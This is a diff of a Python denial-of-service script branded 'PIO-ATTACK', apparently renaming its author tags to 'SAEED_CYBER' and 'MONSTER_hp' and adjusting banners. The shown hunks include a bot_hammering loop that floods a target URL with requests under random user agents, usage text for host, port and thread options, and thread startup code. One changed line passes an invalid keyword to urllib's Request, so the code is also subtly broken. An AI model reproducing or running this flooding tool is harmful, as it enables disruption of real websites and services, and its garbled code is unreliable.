@@ -1,8 +1,3 @@
-# __  __                 _                _   _   _             _
-#|  \/  | ___  _ __  ___| |_ ___ _ __    / \ | |_| |_ __ _  ___| | _____ _ __
-#| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|  / _ \| __| __/ _` |/ __| |/ / _ \ '__|
-#| |  | | (_) | | | \__ \ ||  __/ |    / ___ \ |_| || (_| | (__|   <  __/ |
-#|_|  |_|\___/|_| |_|___/\__\___|_|___/_/   \_\__|\__\__,_|\___|_|\_\___|_|
 #https://t.me/MONSTER_hp
 import os
 os.system('clear')
@@ -34,8 +29,8 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,MONSTER_hp={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is PIO-ATTACK \033[0m")
+			req = urllib.request.urlopen(urllib.request.Request(url,SAEED_CYBER={'User-Agent': random.choice(uagent)}))
+			print("\033[94mbot is SAEED_CYBER_Attacker...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -75,7 +70,7 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	               </> PIO-ATTACK </> 
+	print (''' \033[92m	                </> PIO-ATTACK </> 
 	    >>>>>> GitHub : https://github.com/PIO-HACK <<<<<<
 	>>>>>> Telegram chanell : https://T.me/PIO-HACK <<<<<< 
 	help : python PIO-ATTACK.py [-s] [-p] [-t]
@@ -117,7 +112,7 @@ def get_parameters():
 
 # reading MONSTER_hp
 global data
-SEEAD_CYBER = open("SAEED_CYBER.txt", "r")
+SAEED_CYBER = open("SAEED_CYBER.txt", "r")
 data = SAEED_CYBER.read()
 SAEED_CYBER.close()
 #task queue are q,w
@@ -129,12 +124,12 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[91m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[92m ____ ___ ___          _  _____ _____  _    ____ _  __\033[0m")
-	print("\033[92m|  _ \_ _/ _ \        / \|_   _|_   _|/ \  / ___| |/ /\033[0m")
-	print("\033[92m| |_) | | | | |_____ / _ \ | |   | | / _ \| |   | ' /\033[0m")
-	print("\033[92m|  __/| | |_| |_____/ ___ \| |   | |/ ___ \ |___| . \/ |\033[0m")
-	print("\033[92m|_|  |___\___/     /_/   \_\_|   |_/_/   \_\____|_|\_\\033[0m")
+	print("\033[94m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[92m ____ ___ ___          _  _____ _____  _    ____ _  __  \033[0m")
+	print("\033[92m|  _ \_ _/ _ \        / \|_   _|_   _|/ \  / ___| |/ /  \033[0m")
+	print("\033[92m| |_) | | | | |_____ / _ \ | |   | | / _ \| |   | ' /   \033[0m")
+	print("\033[92m|  __/| | |_| |_____/ ___ \| |   | |/ ___ \ |___| . \   \033[0m")
+	print("\033[92m|_|  |___\___/     /_/   \_\_|   |_/_/   \_\____|_|\_\  \033[0m")
 	print("\033[91mPlease wait SAEED_CYBER...\033[0m")
 	user_agent()
 	my_bots()
@@ -155,7 +150,7 @@ if __name__ == '__main__':
 			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
 		start = time.time()
-		#tasking
+		#MONSTER_hp
 		item = 0
 		while True:
 			if (item>1800): # for no memory crash
